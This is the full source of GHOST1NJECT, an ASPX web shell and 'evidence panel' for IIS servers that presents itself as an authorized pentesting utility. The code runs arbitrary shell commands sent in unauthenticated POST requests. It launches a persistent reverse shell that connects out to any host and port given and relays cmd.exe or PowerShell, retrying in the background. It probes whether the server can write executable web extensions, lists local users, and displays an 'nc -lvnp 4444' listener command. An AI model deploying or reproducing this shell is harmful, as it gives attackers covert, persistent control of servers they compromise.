<%--
===============================================================================
 GHOST1NJECT
 Windows ASPX IIS Terminal + Evidence Panel
===============================================================================

 Version     : 1.9
 Author      : Lucas Diniz
 Organization: Prodigium Academy

 Description :
 Single-file ASPX utility designed to support authorized penetration testing,
 security assessments and controlled cybersecurity laboratory activities.

 Features    :
 - Stateful web terminal
 - IIS, Application Pool and system information
 - Filesystem and upload capability assessment
 - Extension write probes
 - Shell / payload capability diagnostics
 - Persistent command shell with queued stdout/stderr handling
 - cmd.exe / PowerShell capability detection and fallback

 Purpose     :
 Developed as a supporting utility for technical validation, evidence
 collection and reproducible security testing in authorized environments.

 NOTICE      :
 This tool is intended exclusively for systems and environments for which
 explicit authorization to perform security testing has been granted.

===============================================================================
--%>

<%@ Page Language="C#" Debug="false" Trace="false" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Text.RegularExpressions" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Collections.Concurrent" %>

<script runat="server">
private class ProbeResult {
    public bool Writable, Create, Delete;
    public Dictionary<string,bool> Ext = new Dictionary<string,bool>(StringComparer.OrdinalIgnoreCase);
}

protected string Cwd="", OsInfo="", Machine="", UserName="", DotNet="", Iis="", AppPool="", Arch="", TempDir="", MaxRequest="N/A", UsersHtml="";
protected ProbeResult Probe = new ProbeResult();
protected Dictionary<string,bool> ExecCap = new Dictionary<string,bool>();
protected Dictionary<string,bool> TransportCap = new Dictionary<string,bool>();
protected Dictionary<string,string> ShellCap = new Dictionary<string,string>();
protected string ExecLevel="NONE", TransportLevel="NONE", InteractiveLevel="NONE", Overall="NONE", Risk="LOW";

private string H(object v){ return Server.HtmlEncode(Convert.ToString(v)); }
private string Yn(bool v){ return v ? "<span class='green'>YES</span>" : "<span class='red'>NO</span>"; }
private string Level(int n,int max){ return n<=0?"NONE":(n<max/2.0?"LOW":(n<max?"MEDIUM":"HIGH")); }

private string FindExe(params string[] names){
    string win=Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
    List<string> dirs=new List<string>();
    dirs.Add(Path.Combine(win,"System32")); dirs.Add(win);
    string pf=Environment.GetEnvironmentVariable("ProgramFiles"); if(!String.IsNullOrEmpty(pf)) dirs.Add(pf);
    string pfx=Environment.GetEnvironmentVariable("ProgramFiles(x86)"); if(!String.IsNullOrEmpty(pfx)) dirs.Add(pfx);
    string path=Environment.GetEnvironmentVariable("PATH") ?? "";
    foreach(string d in path.Split(Path.PathSeparator)) if(!String.IsNullOrWhiteSpace(d)) dirs.Add(d.Trim());
    foreach(string n in names){
        try { if(Path.IsPathRooted(n) && File.Exists(n)) return n; } catch { }
        foreach(string d in dirs){ try { string p=Path.Combine(d,n); if(File.Exists(p)) return p; } catch { } }
    }
    return null;
}

private string GetCwd(){
    string cwd=Session["cwd"] as string;
    if(String.IsNullOrEmpty(cwd) || !Directory.Exists(cwd)){
        try { cwd=Server.MapPath("."); } catch { cwd=Environment.CurrentDirectory; }
        Session["cwd"]=cwd;
    }
    return cwd;
}

private bool ChangeDirectory(string cmd,out string result){
    Match m=Regex.Match(cmd,@"^cd(?:\s+/d)?(?:\s+(.*))?$",RegexOptions.IgnoreCase|RegexOptions.Singleline);
    if(!m.Success){ result=null; return false; }
    string arg=m.Groups[1].Success?m.Groups[1].Value.Trim().Trim('"','\''):"";
    string cwd=GetCwd();
    if(String.IsNullOrEmpty(arg) || arg=="~") arg=Environment.GetEnvironmentVariable("USERPROFILE") ?? cwd;
    else if(arg=="-") arg=Session["prev_cwd"] as string ?? cwd;
    arg=Environment.ExpandEnvironmentVariables(arg);
    try {
        if(Regex.IsMatch(arg,@"^[A-Za-z]:$")) arg += @"\";
        string next=Path.IsPathRooted(arg)?Path.GetFullPath(arg):Path.GetFullPath(Path.Combine(cwd,arg));
        if(Directory.Exists(next)){
            Session["prev_cwd"]=cwd; Session["cwd"]=next; result=next; return true;
        }
    } catch { }
    result="cd: directory unavailable"; return true;
}

private string ExecuteCommand(string cmd,string cwd){
    try {
        ProcessStartInfo psi=new ProcessStartInfo();
        psi.FileName=Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
        psi.Arguments="/d /c "+cmd;
        psi.WorkingDirectory=Directory.Exists(cwd)?cwd:Environment.CurrentDirectory;
        psi.RedirectStandardOutput=true; psi.RedirectStandardError=true; psi.UseShellExecute=false; psi.CreateNoWindow=true;
        using(Process p=Process.Start(psi)){
            string output=p.StandardOutput.ReadToEnd(); string error=p.StandardError.ReadToEnd();
            p.WaitForExit(5000); string all=output+error; return String.IsNullOrEmpty(all)?"[no output]":all;
        }
    } catch(Exception ex){ return "[Error: "+ex.Message+"]"; }
}

// ============================================================
// REVERSE SHELL PERSISTENTE – COM DRAIN GARANTIDO
// ============================================================
private bool StartReverseShell(string host,int port){
    try { Thread t=new Thread(()=>ReverseShellLoop(host,port)); t.IsBackground=true; t.Start(); return true; }
    catch { return false; }
}

private void ReverseShellLoop(string host,int port){
    while(true){
        try {
            using(TcpClient client=new TcpClient()){
                client.Connect(host,port);
                using(NetworkStream stream=client.GetStream()){
                    Process process = null;
                    // Tenta cmd.exe (com fallback para PowerShell)
                    try {
                        string cmdPath = FindExe("cmd.exe") ?? "cmd.exe";
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = cmdPath;
                        psi.Arguments = "";
                        psi.UseShellExecute = false;
                        psi.RedirectStandardInput = true;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.CreateNoWindow = true;
                        psi.StandardInputEncoding = System.Text.Encoding.UTF8;
                        psi.StandardOutputEncoding = System.Text.Encoding.UTF8;
                        psi.StandardErrorEncoding = System.Text.Encoding.UTF8;
                        process = Process.Start(psi);
                    } catch { }

                    if (process == null || process.HasExited) {
                        try {
                            string psPath = FindExe("powershell.exe") ?? "powershell.exe";
                            if (File.Exists(psPath)) {
                                ProcessStartInfo psi = new ProcessStartInfo();
                                psi.FileName = psPath;
                                psi.Arguments = "-NoExit -Command -";
                                psi.UseShellExecute = false;
                                psi.RedirectStandardInput = true;
                                psi.RedirectStandardOutput = true;
                                psi.RedirectStandardError = true;
                                psi.CreateNoWindow = true;
                                psi.StandardInputEncoding = System.Text.Encoding.UTF8;
                                psi.StandardOutputEncoding = System.Text.Encoding.UTF8;
                                psi.StandardErrorEncoding = System.Text.Encoding.UTF8;
                                process = Process.Start(psi);
                            }
                        } catch { }
                    }

                    if (process == null || process.HasExited) {
                        stream.WriteByte(0);
                        continue;
                    }

                    RunShellRelay(stream, process);
                    Thread.Sleep(5000);
                }
            }
        } catch {
            Thread.Sleep(5000);
        }
    }
}

private void RunShellRelay(NetworkStream socketStream, Process shellProcess){
    BlockingCollection<byte[]> outputQueue = new BlockingCollection<byte[]>();
    int activeProducers = 2;
    CancellationTokenSource cts = new CancellationTokenSource();

    // Tarefa: lê do socket e escreve no stdin do shell
    Task readSocketTask = Task.Run(() => {
        try {
            byte[] buffer = new byte[4096];
            Stream stdin = shellProcess.StandardInput.BaseStream;
            while (!cts.IsCancellationRequested) {
                int read = socketStream.Read(buffer, 0, buffer.Length);
                if (read == 0) break;
                stdin.Write(buffer, 0, read);
                stdin.Flush();
            }
        } catch { }
    }, cts.Token);

    // Produtor: stdout
    Task stdoutTask = Task.Run(() => {
        try {
            Stream stdout = shellProcess.StandardOutput.BaseStream;
            byte[] buffer = new byte[4096];
            while (!cts.IsCancellationRequested) {
                int read = stdout.Read(buffer, 0, buffer.Length);
                if (read == 0) break;
                byte[] chunk = new byte[read];
                Array.Copy(buffer, 0, chunk, 0, read);
                outputQueue.Add(chunk, cts.Token);
            }
        } catch (OperationCanceledException) { }
        finally {
            if (Interlocked.Decrement(ref activeProducers) == 0)
                outputQueue.CompleteAdding();
        }
    }, cts.Token);

    // Produtor: stderr
    Task stderrTask = Task.Run(() => {
        try {
            Stream stderr = shellProcess.StandardError.BaseStream;
            byte[] buffer = new byte[4096];
            while (!cts.IsCancellationRequested) {
                int read = stderr.Read(buffer, 0, buffer.Length);
                if (read == 0) break;
                byte[] chunk = new byte[read];
                Array.Copy(buffer, 0, chunk, 0, read);
                outputQueue.Add(chunk, cts.Token);
            }
        } catch (OperationCanceledException) { }
        finally {
            if (Interlocked.Decrement(ref activeProducers) == 0)
                outputQueue.CompleteAdding();
        }
    }, cts.Token);

    // Consumidor: escreve no socket a partir da fila (não usa token para garantir drain)
    Task writerTask = Task.Run(() => {
        try {
            foreach (byte[] chunk in outputQueue.GetConsumingEnumerable()) {
                socketStream.Write(chunk, 0, chunk.Length);
                socketStream.Flush();
            }
        } catch { }
    });

    // Aguarda até que qualquer uma das três tarefas de leitura/produtor termine
    Task firstCompleted = Task.WhenAny(readSocketTask, stdoutTask, stderrTask).Result;

    // Se o socket foi fechado primeiro, cancelamos tudo imediatamente
    if (firstCompleted == readSocketTask)
    {
        cts.Cancel();
    }
    else
    {
        // Um produtor terminou; aguardamos o outro terminar naturalmente
        Task.WaitAll(stdoutTask, stderrTask, TimeSpan.FromSeconds(10));
        // Após ambos terminarem, a fila foi completada (activeProducers == 0)
        // Aguardamos o writer esvaziar a fila e terminar (timeout de segurança)
        writerTask.Wait(TimeSpan.FromSeconds(5));
    }

    // Cleanup final
    try { shellProcess.Kill(); } catch { }
    try { shellProcess.Dispose(); } catch { }
    try { outputQueue.Dispose(); } catch { }
}

// ============================================================
// EVIDÊNCIA / PROBE (INALTERADO)
// ============================================================
private ProbeResult WriteProbe(string dir){
    ProbeResult r=new ProbeResult();
    try {
        string tag=".ghost_probe_"+Guid.NewGuid().ToString("N").Substring(0,8); string p=Path.Combine(dir,tag);
        r.Writable=true;
        try { File.WriteAllText(p,"GHOST_WRITE_PROBE\r\n"); r.Create=true; try { File.Delete(p); r.Delete=!File.Exists(p); } catch { } }
        catch { r.Writable=false; }
        foreach(string ext in new string[]{"aspx","ashx","php"}){
            string f=p+"."+ext; bool ok=false;
            try { File.WriteAllText(f,"GHOST_EXTENSION_WRITE_PROBE\r\n"); ok=File.Exists(f); } catch { }
            r.Ext[ext]=ok; if(ok){ try { File.Delete(f); } catch { } }
        }
    } catch { }
    return r;
}

private string GetLocalUsers(){
    try {
        ProcessStartInfo psi=new ProcessStartInfo(); psi.FileName=Environment.GetEnvironmentVariable("ComSpec")??"cmd.exe"; psi.Arguments="/d /c net user";
        psi.RedirectStandardOutput=true; psi.UseShellExecute=false; psi.CreateNoWindow=true;
        using(Process p=Process.Start(psi)){
            string output=p.StandardOutput.ReadToEnd(); p.WaitForExit(3000); List<string> users=new List<string>(); bool body=false;
            foreach(string raw in output.Split('\n')){
                string line=raw.TrimEnd('\r'); if(line.Contains("---")){ body=!body; continue; } if(!body) continue;
                foreach(string part in Regex.Split(line.Trim(),@"\s{2,}")) if(!String.IsNullOrWhiteSpace(part)) users.Add(H(part.Trim()));
            }
            return users.Count>0?String.Join("<br>",users.ToArray()):"<span class='red'>Unavailable</span>";
        }
    } catch { return "<span class='red'>Unavailable</span>"; }
}

private void LoadEvidence(){
    Cwd=GetCwd(); OsInfo=Environment.OSVersion.ToString(); Machine=Environment.MachineName;
    try { UserName=WindowsIdentity.GetCurrent().Name; } catch { UserName=Environment.UserName; }
    DotNet=Environment.Version.ToString(); Iis=Request.ServerVariables["SERVER_SOFTWARE"]??"unknown";
    AppPool=Environment.GetEnvironmentVariable("APP_POOL_ID")??"N/A"; Arch=IntPtr.Size==8?"64-bit":"32-bit"; TempDir=Path.GetTempPath();
    try { HttpRuntimeSection s=(HttpRuntimeSection)WebConfigurationManager.GetSection("system.web/httpRuntime"); if(s!=null) MaxRequest=s.MaxRequestLength+" KB"; } catch { }
    Probe=WriteProbe(Cwd); bool anyExt=false; foreach(bool v in Probe.Ext.Values) if(v) anyExt=true; Risk=!Probe.Create?"LOW":(anyExt?"HIGH*":"MEDIUM");
    string cmd=FindExe("cmd.exe"); string ps=FindExe("powershell.exe");
    ExecCap["Process"]=true;
    ExecCap["cmd"]=!String.IsNullOrEmpty(cmd);
    ExecCap["powershell"]=!String.IsNullOrEmpty(ps);
    TransportCap["TcpClient"]=true;
    TransportCap["Socket"]=true;
    TransportCap["NetworkStream"]=true;
    ShellCap["cmd"]=cmd;
    ShellCap["powershell"]=ps;
    int en=0; foreach(bool v in ExecCap.Values) if(v) en++; int tn=0; foreach(bool v in TransportCap.Values) if(v) tn++; int sn=0; foreach(string v in ShellCap.Values) if(!String.IsNullOrEmpty(v)) sn++;
    ExecLevel=Level(en,ExecCap.Count); TransportLevel=Level(tn,TransportCap.Count); InteractiveLevel=sn>=2?"MEDIUM":(sn==1?"LOW":"NONE"); Overall=(en>0&&tn>0)?(en==ExecCap.Count?"HIGH":"MEDIUM"):(en>0?"LOW":"NONE");
    UsersHtml=GetLocalUsers();
}

void Page_Load(object sender,EventArgs e){
    Response.ContentEncoding=System.Text.Encoding.UTF8;
    if(Request.HttpMethod=="POST" && Request.Form["cmd"]!=null){
        Response.ContentType="text/plain"; string cmd=Request.Form["cmd"]??""; string cdResult;
        if(ChangeDirectory(cmd,out cdResult)) Response.Write(cdResult); else if(cmd.Trim().Equals("pwd",StringComparison.OrdinalIgnoreCase)) Response.Write(GetCwd()); else Response.Write(ExecuteCommand(cmd,GetCwd()));
        Response.End(); return;
    }
    if(Request.HttpMethod=="POST" && Request.Form["rev_host"]!=null && Request.Form["rev_port"]!=null){
        Response.ContentType="text/plain"; string host=(Request.Form["rev_host"]??"").Trim(); int port; bool validPort=Int32.TryParse(Request.Form["rev_port"],out port)&&port>0&&port<=65535;
        IPAddress parsedIp; bool validHost=IPAddress.TryParse(host,out parsedIp) || Uri.CheckHostName(host)!=UriHostNameType.Unknown;
        Response.Write(validPort&&validHost&&StartReverseShell(host,port)?"OK":"FAIL"); Response.End(); return;
    }
    Response.ContentType="text/html"; LoadEvidence();
}
</script>
<!doctype html><html><head><meta charset="utf-8"><title>GHOST1NJECT | Windows ASPX Terminal + Panel</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0e0a;color:#0f0;font:13px 'Courier New',monospace;height:100vh;display:flex;flex-direction:column}.hdr,.banner{background:#1a1e1a;padding:6px 12px;border-bottom:1px solid #0f0}.hdr{display:flex;justify-content:space-between}.banner{text-align:center}.main{display:flex;flex:1;overflow:hidden}.termwrap{flex:2;display:flex;flex-direction:column;border-right:1px solid #0f0}.term{flex:1;overflow:auto;padding:10px;white-space:pre-wrap;word-break:break-all}.promptrow{display:flex;gap:8px;padding:8px 12px;border-top:1px solid #0f0}.cmd{flex:1;background:transparent;border:0;color:#0f0;font:13px 'Courier New';outline:0}.panelwrap{flex:1;overflow:auto}.panel{padding:12px}h3{font-size:14px;border-bottom:1px solid #0f0;padding-bottom:4px}h4{color:#ff0;margin:13px 0 5px;font-size:12px}.item{font-size:11px;margin:3px 0;word-break:break-all}.box{background:#1a1e1a;padding:8px;margin:10px 0;border-left:3px solid #0f0}button,input{background:#1a1e1a;color:#0f0;border:1px solid #0f0;padding:5px 8px}button{cursor:pointer}.panel input,.panel button{width:100%;margin-bottom:7px}.green{color:#0f0}.red{color:#f66}.yellow{color:#ff0}.muted{color:#aaa}.line{margin-bottom:2px}.status{font-size:11px}
</style></head><body>
<div class="banner"><span class="green">[+] GHOST1NJECT Windows ASPX v1.9</span> | <span class="yellow">IIS Terminal</span> | <span class="green">Persistent Shell + Reliable Drain</span></div>
<div class="hdr"><span>ghost1nject@<%=H(Machine)%></span><span class="status">ONLINE | <%=H(UserName)%></span></div>
<div class="main"><div class="termwrap"><div class="term" id="terminal"><div class="line">[+] GHOST1NJECT Windows ASPX v1.9</div><div class="line">[+] System: <%=H(OsInfo)%></div><div class="line">[+] User: <%=H(UserName)%></div><div class="line" id="cwdLine">[+] Directory: <%=H(Cwd)%></div><div class="line">[+] .NET: <%=H(DotNet)%></div><div class="line">---</div><div class="line">[*] Web terminal keeps directory changes between commands</div><div class="line">[*] Reverse shell: persistent shell with guaranteed output drain</div><div class="line">---</div></div><div class="promptrow"><span>PS&gt;</span><input id="cmdInput" class="cmd" autofocus autocomplete="off"><button id="clearBtn">Clear</button></div></div>
<div class="panelwrap"><div class="panel"><h3>[#] REVERSE CALLBACK</h3><div class="box"><div>[*] Listener:</div><div class="yellow">nc -lvnp 4444</div></div><input id="revHost" placeholder="Your IP"><input id="revPort" placeholder="Port"><button id="startRevBtn">[+] START CALLBACK</button><div id="revMsg" class="item"></div>
<h4>[+] SYSTEM INFO</h4><div class="item"><span class="yellow">OS:</span> <%=H(OsInfo)%></div><div class="item"><span class="yellow">Machine:</span> <%=H(Machine)%></div><div class="item"><span class="yellow">Identity:</span> <%=H(UserName)%></div><div class="item"><span class="yellow">Directory:</span> <%=H(Cwd)%></div><div class="item"><span class="yellow">.NET:</span> <%=H(DotNet)%></div><div class="item"><span class="yellow">IIS:</span> <%=H(Iis)%></div><div class="item"><span class="yellow">App Pool:</span> <%=H(AppPool)%></div><div class="item"><span class="yellow">Process:</span> <%=H(Arch)%></div>
<h4>[+] FILESYSTEM / UPLOAD</h4><div class="item"><span class="yellow">Writable:</span> <%=Yn(Probe.Writable)%></div><div class="item"><span class="yellow">Create:</span> <%=Yn(Probe.Create)%> <span class="yellow">Delete:</span> <%=Yn(Probe.Delete)%></div><div class="item"><span class="yellow">Temp:</span> <%=H(TempDir)%></div><div class="item"><span class="yellow">ASP.NET max request:</span> <%=H(MaxRequest)%></div>
<h4>[+] EXTENSION WRITE PROBE</h4><% foreach(KeyValuePair<string,bool> kv in Probe.Ext){ %><div class="item"><span class="yellow">.<%=H(kv.Key)%>:</span> <%=Yn(kv.Value)%></div><% } %><div class="item"><span class="yellow">Write exposure:</span> <b><%=H(Risk)%></b></div><div class="item muted">* Creation only; IIS handler execution is not tested.</div>
<h4>[+] SHELL / PAYLOAD CAPABILITY</h4><div class="item"><span class="yellow">EXEC:</span> <% foreach(KeyValuePair<string,bool> kv in ExecCap){ %><%=H(kv.Key)%>=<%=Yn(kv.Value)%> <% } %></div><div class="item"><span class="yellow">Execution:</span> <b><%=H(ExecLevel)%></b></div><div class="item"><span class="yellow">TRANSPORT:</span> <% foreach(KeyValuePair<string,bool> kv in TransportCap){ %><%=H(kv.Key)%>=<%=Yn(kv.Value)%> <% } %></div><div class="item"><span class="yellow">Transport:</span> <b><%=H(TransportLevel)%></b></div><div class="item"><span class="yellow">CONSOLE:</span> <% foreach(KeyValuePair<string,string> kv in ShellCap){ %><%=H(kv.Key)%>=<%=String.IsNullOrEmpty(kv.Value)?"NO":"YES"%> <% } %></div><div class="item"><span class="yellow">Interactive:</span> <b><%=H(InteractiveLevel)%></b> <span class="yellow">Overall:</span> <b><%=H(Overall)%></b></div><div class="item muted">Capability only; no outbound/interactivity probe is performed by this panel.</div>
<h4>[+] LOCAL USERS</h4><div class="item"><%=UsersHtml%></div></div></div></div>
<script>
const t=document.getElementById('terminal'),i=document.getElementById('cmdInput');let hist=[],hi=-1;function esc(s){return s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}function line(s,e=0){let d=document.createElement('div');d.className='line';d.style.color=e?'#f66':'#0f0';d.innerHTML=s;t.appendChild(d);t.scrollTop=t.scrollHeight}async function post(o){let f=new FormData();Object.keys(o).forEach(k=>f.append(k,o[k]));return(await fetch('',{method:'POST',body:f})).text()}async function run(c){if(!c.trim())return;line('&gt; '+esc(c));if(c.toLowerCase().startsWith('revshell ')){let p=c.trim().split(/\s+/);if(p.length<3)return line('[-] Usage: revshell IP PORT',1);let r=await post({rev_host:p[1],rev_port:p[2]});line(r==='OK'?'[+] Reverse callback launched':'[-] Failed to launch callback',r!=='OK');return}try{let o=await post({cmd:c});o.split('\n').forEach(x=>line(esc(x)));if(/^cd(?:\s|$)/i.test(c)&&o&&!o.startsWith('cd:'))document.getElementById('cwdLine').innerHTML='[+] Directory: '+esc(o)}catch(e){line('Error: '+esc(e.message),1)}line('')}
i.onkeydown=e=>{if(e.key==='Enter'){let c=i.value;i.value='';if(c.trim()){hist.unshift(c);hist=hist.slice(0,50);hi=-1;run(c)}}else if(e.key==='ArrowUp'){e.preventDefault();if(hi+1<hist.length)i.value=hist[++hi]}else if(e.key==='ArrowDown'){e.preventDefault();if(hi>0)i.value=hist[--hi];else if(hi===0){hi=-1;i.value=''}}};document.getElementById('clearBtn').onclick=()=>{t.innerHTML='';line('[+] Terminal cleared.');line('')};document.getElementById('startRevBtn').onclick=async()=>{let h=document.getElementById('revHost').value,p=document.getElementById('revPort').value,m=document.getElementById('revMsg');if(!h||!p){m.innerHTML='<span class="red">[-] Enter IP and port</span>';return}m.textContent='[*] Launching callback...';let r=await post({rev_host:h,rev_port:p});m.innerHTML=r==='OK'?'<span class="green">[+] Callback launched. Keep listener open.</span>':'<span class="red">[-] Failed to launch callback</span>'};i.focus();
</script></body></html>
